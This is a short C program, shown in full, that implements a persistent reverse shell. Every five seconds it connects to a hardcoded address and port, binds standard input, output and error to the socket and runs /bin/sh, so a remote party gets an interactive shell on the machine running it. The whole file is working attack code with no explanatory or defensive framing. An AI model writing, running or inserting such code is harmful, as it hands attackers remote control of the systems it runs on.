#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define REMOTE_ADDR "192.168.28.1"
#define REMOTE_PORT 1234

int main(int argc, char *argv[])
{
    while (1)
    {
        sleep(5);
        struct sockaddr_in sa;
        int s;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)))
            continue;

        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execve("/bin/sh", 0, 0);
    }
    return 0;
}
